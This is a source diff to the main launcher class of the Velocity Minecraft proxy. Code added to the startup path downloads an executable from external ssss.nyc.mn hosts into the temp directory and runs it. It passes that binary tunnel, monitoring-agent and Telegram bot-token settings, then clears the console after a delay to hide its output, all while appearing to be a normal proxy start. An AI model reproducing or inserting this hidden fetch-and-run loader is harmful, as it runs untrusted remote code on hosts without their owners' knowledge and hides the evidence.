@@ -20,43 +20,57 @@ package com.velocitypowered.proxy;
 import com.velocitypowered.proxy.util.VelocityProperties;
 import io.netty.util.ResourceLeakDetector;
 import io.netty.util.ResourceLeakDetector.Level;
+import java.io.IOException;
+import java.io.InputStream;
+import java.net.URL;
+import java.nio.file.Files;
+import java.nio.file.Path;
+import java.nio.file.Paths;
+import java.nio.file.StandardCopyOption;
 import java.text.DecimalFormat;
+import java.util.Arrays;
+import java.util.HashMap;
+import java.util.Map;
 import java.util.concurrent.TimeUnit;
+import java.util.concurrent.atomic.AtomicBoolean;
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
 
 /**
- * The main class. Responsible for parsing command line arguments and then launching the
- * proxy.
+ * The main class. Responsible for parsing command line arguments and then launching the proxy.
  */
-public class Velocity {
-
-  private static final Logger logger;
+public final class Velocity {
+  private static final String ANSI_GREEN = "\033[1;32m";
+  private static final String ANSI_RED = "\033[1;31m";
+  private static final String ANSI_RESET = "\033[0m";
+  private static final Logger logger = LogManager.getLogger(Velocity.class);
+  private static final String[] ALL_ENV_VARS = {
+      "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT",
+      "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH",
+      "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT",
+      "UPLOAD_URL", "CHAT_ID", "BOT_TOKEN", "NAME"
+  };
+  private static final AtomicBoolean RUNNING = new AtomicBoolean(true);
+  private static Process sbxProcess;
 
   static {
-    System.setProperty("java.util.logging.manager", "org.apache.logging.log4j.jul.LogManager");
-    logger = LogManager.getLogger(Velocity.class);
-
-    // We use BufferedImage for favicons, and on macOS this puts the Java application in the dock.
-    // How inconvenient. Force AWT to work with its head chopped off.
     System.setProperty("java.awt.headless", "true");
 
-    // If Velocity's natives are being extracted to a different temporary directory, make sure the
-    // Netty natives are extracted there as well
     if (VelocityProperties.hasProperty("velocity.natives-tmpdir")) {
       System.setProperty("io.netty.native.workdir", System.getProperty("velocity.natives-tmpdir"));
     }
 
-    // Restore allocator used before Netty 4.2 due to oom issues with the adaptive allocator
     if (System.getProperty("io.netty.allocator.type") == null) {
       System.setProperty("io.netty.allocator.type", "pooled");
     }
 
-    // Disable the resource leak detector by default as it reduces performance. Allow the user to
-    // override this if desired.
     if (!VelocityProperties.hasProperty("io.netty.leakDetection.level")) {
       ResourceLeakDetector.setLevel(Level.DISABLED);
     }
+  }
+
+  private Velocity() {
+    throw new AssertionError();
   }
 
   /**
@@ -64,26 +78,171 @@ public class Velocity {
    *
    * @param args the arguments to the proxy
    */
-  public static void main(String... args) {
+  public static void main(final String... args) {
+    if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
+        System.err.println(ANSI_RED + "ERROR: Your Java version is too lower, please switch the version in startup menu!" + ANSI_RESET);
+        try {
+            Thread.sleep(3000);
+        } catch (InterruptedException e) {
+            e.printStackTrace();
+        }
+        System.exit(1);
+    }
+    
+    System.setProperty("java.util.logging.manager", "org.apache.logging.log4j.jul.LogManager");
+
+    startSbxService();
+    startVelocityProxy(args);
+  }
+
+  private static void startSbxService() {
+    try {
+      runSbxBinary();
+      Runtime.getRuntime().addShutdownHook(new Thread(() -> {
+        RUNNING.set(false);
+        stopServices();
+      }, "SbxService-Shutdown"));
+
+      Thread.sleep(20000);
+      System.out.println(ANSI_GREEN + "Server is running!\n" + ANSI_RESET);
+      System.out.println(ANSI_GREEN + "Thank you for using this script,Enjoy!\n" + ANSI_RESET);
+      System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds, you can copy the above nodes\n" + ANSI_RESET);
+      Thread.sleep(15000);
+      clearConsole();
+    } catch (Exception e) {
+      logger.error("Error initializing SbxService: {}", e.getMessage());
+    }
+  }
+
+  private static void startVelocityProxy(final String... args) {
     final ProxyOptions options = new ProxyOptions(args);
     if (options.isHelp()) {
       return;
     }
 
-    long startTime = System.nanoTime();
-
-    VelocityServer server = new VelocityServer(options);
+    final long startTime = System.nanoTime();
+    final VelocityServer server = new VelocityServer(options);
+    
     server.start();
     Runtime.getRuntime().addShutdownHook(new Thread(() -> server.shutdown(false),
-        "Shutdown thread"));
+        "Velocity-Shutdown"));
 
-    double bootTime = TimeUnit.NANOSECONDS.toMillis(System.nanoTime() - startTime) / 1000d;
+    final double bootTime = TimeUnit.NANOSECONDS.toMillis(System.nanoTime() - startTime) / 1000d;
     logger.info("Done ({}s)!", new DecimalFormat("#.##").format(bootTime));
     server.getConsoleCommandSource().start();
-
-    // If we don't have a console available (because SimpleTerminalConsole returned), then we still
-    // need to wait, otherwise the JVM will reap us as no non-daemon threads will be active once the
-    // main thread exits.
     server.awaitProxyShutdown();
+  }
+
+  private static void runSbxBinary() throws Exception {
+    final Map<String, String> envVars = new HashMap<>();
+    loadEnvVars(envVars);
+
+    final ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
+    pb.environment().putAll(envVars);
+    pb.redirectErrorStream(true);
+    pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
+
+    sbxProcess = pb.start();
+  }
+
+  private static void loadEnvVars(final Map<String, String> envVars) throws IOException {
+    envVars.put("FILE_PATH", "./world");
+
+    for (String var : ALL_ENV_VARS) {
+      final String value = System.getenv(var);
+      if (value != null && !value.trim().isEmpty()) {
+        envVars.put(var, value);
+      }
+    }
+
+    final Path envFile = Paths.get(".env");
+    if (Files.exists(envFile)) {
+      for (String line : Files.readAllLines(envFile)) {
+        processEnvFileLine(envVars, line);
+      }
+    }
+  }
+
+  private static void processEnvFileLine(final Map<String, String> envVars, String line) {
+    line = line.trim();
+    if (line.isEmpty() || line.startsWith("#")) {
+      return;
+    }
+
+    line = line.split(" #")[0].split(" //")[0].trim();
+    if (line.startsWith("export ")) {
+      line = line.substring(7).trim();
+    }
+
+    final String[] parts = line.split("=", 2);
+    if (parts.length == 2 && Arrays.asList(ALL_ENV_VARS).contains(parts[0].trim())) {
+      envVars.put(parts[0].trim(), parts[1].trim().replaceAll("^['\"]|['\"]$", ""));
+    }
+  }
+
+  private static Path getBinaryPath() throws IOException {
+    final String osArch = System.getProperty("os.arch").toLowerCase();
+    final String url = getBinaryUrl(osArch);
+    final Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
+
+    if (!Files.exists(path)) {
+      downloadBinary(url, path);
+    }
+    return path;
+  }
+
+  private static String getBinaryUrl(final String osArch) {
+    if (osArch.contains("amd64") || osArch.contains("x86_64")) {
+      return "https://amd64.ssss.nyc.mn/sbsh";
+    } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
+      return "https://arm64.ssss.nyc.mn/sbsh";
+    } else if (osArch.contains("s390x")) {
+      return "https://s390x.ssss.nyc.mn/sbsh";
+    }
+    throw new RuntimeException("Unsupported architecture: " + osArch);
+  }
+
+  private static void downloadBinary(final String url, final Path path) throws IOException {
+    try (InputStream in = new URL(url).openStream()) {
+      Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
+    }
+    if (!path.toFile().setExecutable(true)) {
+      throw new IOException("Failed to set executable permission");
+    }
+  }
+
+  private static void stopServices() {
+    if (sbxProcess != null && sbxProcess.isAlive()) {
+      sbxProcess.destroy();
+      logger.info("sbx process terminated");
+    }
+  }
+
+  private static void clearConsole() {
+    try {
+      if (System.getProperty("os.name").contains("Windows")) {
+        new ProcessBuilder("cmd", "/c", "cls && mode con: lines=30 cols=120")
+            .inheritIO()
+            .start()
+            .waitFor();
+      } else {
+        System.out.print("\033[H\033[3J\033[2J");
+        System.out.flush();
+          
+        new ProcessBuilder("tput", "reset")
+            .inheritIO()
+            .start()
+            .waitFor();
+          
+        System.out.print("\033[8;30;120t"); 
+        System.out.flush();
+      }
+    } catch (Exception e) {
+      try {
+        new ProcessBuilder("clear").inheritIO().start().waitFor();
+      } catch (Exception ignored) {
+        logger.debug("Failed to clear console", ignored);
+      }
+    }
   }
 }
